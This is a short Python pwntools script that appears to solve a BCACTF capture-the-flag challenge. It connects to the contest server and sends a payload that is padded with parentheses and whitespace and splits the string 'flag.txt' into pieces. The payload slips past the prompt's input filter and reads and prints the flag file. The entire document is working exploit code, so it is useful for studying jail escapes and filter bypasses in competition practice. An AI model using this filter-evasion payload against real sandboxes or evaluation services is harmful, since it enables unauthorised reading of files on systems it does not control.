from pwn import *

host = 'challs.bcactf.com'
port = 52317


payload = (
    "((((print("
    "                  open("
    "                'flag'"
    " '.'"
    "  'txt'). read()"
    ")))))"
)

def main():
    r = remote(host, port)
    r.recvuntil(b'>>> ')
    r.sendline(payload.encode())
    flag = r.recvuntil(b'>>> ', drop=True)
    print(flag.decode().strip())

if __name__ == '__main__':
    main()